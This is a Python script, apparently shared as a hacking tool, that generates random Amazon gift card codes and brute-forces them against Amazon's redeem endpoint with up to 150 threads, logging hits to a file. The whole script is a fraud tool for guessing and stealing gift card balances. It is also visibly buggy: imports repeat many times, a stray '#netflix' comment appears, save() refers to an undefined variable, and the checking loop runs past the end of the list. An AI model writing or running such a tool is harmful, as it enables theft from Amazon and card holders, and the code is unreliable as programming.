from colorama import Fore, init
import threading 
import requests, random, string, ctypes, time, os, sys
import requests, threading, time, ctypes, string, random, os
from colorama import init, Fore
from time import sleep
from time import sleep
import os
import platform
import random
import string
import time
import sys
import subprocess, requests, time, os
from random import choice
import random
from random import randint
import time
import itertools
from colorama import Fore
import sys, os
import colorama
import random
import colorama
from colorama import Fore, init
from colorama import init
init()
import subprocess, requests, time, os
#Number To Generate
import random
from random import randint
import time
gentype = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

#Number To Generate

os.system("cls")
init()
ctypes.windll.kernel32.SetConsoleTitleW('A.G.C | Amazon Giftcard Generator + Checker | Developed By Danko')
print("""
\033[1;35;40m 
                                         
                                          ▄▄▄             ▄████       ▄████▄  
                                          ▒████▄          ██▒ ▀█▒     ▒██▀ ▀█  
                                          ▒██  ▀█▄       ▒██░▄▄▄░     ▒▓█    ▄ 
                                          ░██▄▄▄▄██      ░▓█  ██▓     ▒▓▓▄ ▄██▒
                                          ▓█   ▓██▒ ██▓ ░▒▓███▀▒ ██▓ ▒ ▓███▀ ░
                                          ▒▒   ▓▒█░ ▒▓▒  ░▒   ▒  ▒▓▒ ░ ░▒ ▒  ░
                                          ▒   ▒▒ ░ ░▒    ░   ░  ░▒    ░  ▒   
                                          ░   ▒    ░   ░ ░   ░  ░   ░        
                                          ░  ░  ░        ░   ░  ░ ░      
                                          ░            ░  ░        """)

option = str(input("\033[1;34;40m[1] Amazon Giftcard Generator\033[1;34;40m\n[2] Amazon Giftcard Checker\n[>] Option: "))

#netflix
if option == '2':
        ctypes.windll.kernel32.SetConsoleTitleW('Loading Amazon Giftcard Checker...')
        giftcards = []
        num = 0
        valid = 0
        invalid = 0
        print()


        def load_accounts():
                with open('amazon.txt','r', encoding='utf8') as f:
                        for x in f.readlines():
                                giftcards.append(x.strip())

        def safe_print(content):
                print("{}\n".format(content))

        def save(giftcard):
                with open('valid.txt','a', encoding='utf8') as f:
                        f.write(giftcard + '\n')

        def checker():
                global giftcards
                global num
                global counter
                global invalid
                global valid
                success_keyword = "<b>Enter claim code</b>"
                r = requests.post("https://www.amazon.com/gc/redeem?ref_=gcui_b_e_r_c_d_b_w", data={"giftcard": giftcards[num]})
                if success_keyword in r.text:
                        valid += 1
                        print(Fore.GREEN + '[' + Fore.WHITE + 'VALID' + Fore.GREEN + '] ' + giftcards[num] + Fore.WHITE)
                        save(giftcard[num])
                        ctypes.windll.kernel32.SetConsoleTitleW("Amazon Giftcard Checker | Checked: " + str(num) + "/" + str(len(giftcards)) + " | Valid: " + str(valid) + " | Invalid: " + str(invalid))
                else:
                        print('\033[1;31;40m[' + '\033[1;31;40mINVALID' + '\033[1;31;40m] ' + giftcards[num])
                        invalid += 1
                        ctypes.windll.kernel32.SetConsoleTitleW("Amazon Giftcard Checker | Checked: " + str(num) + "/" + str(len(giftcards)) + " | Valid: " + str(valid) + " | Invalid: " + str(invalid))

        load_accounts()

        while True:
                if threading.active_count() < 150:
                        threading.Thread(target=checker, args=()).start()
                        time.sleep(0.25)
                        num+=1
if(option == "1"):
    total = input("\nEnter The Amount Of Gift Cards U Want To Generate: ")
    number = int(total)
    file = (total + " Amazon Giftcards.txt")
    for x in range(number):
        generate1 = random.choice(gentype)
        generate2 = random.choice(gentype)
        generate3 = random.choice(gentype)
        generate4 = random.choice(gentype)
        space1 = "-"
        generate5 = random.choice(gentype)
        generate6 = random.choice(gentype)
        generate7 = random.choice(gentype)
        generate8 = random.choice(gentype)
        generate9 = random.choice(gentype)
        generate10 = random.choice(gentype)
        space2 = "-"
        generate11 = random.choice(gentype)
        generate12 = random.choice(gentype)
        generate13 = random.choice(gentype)
        generate14 = random.choice(gentype)
        newline = "\n"
        with open(file, 'a') as out:
            out.write(generate1+generate2+generate3+generate4+space1+generate5+generate6+generate7+generate8+generate9+generate10+space2+generate11+generate12+generate13+generate14+newline)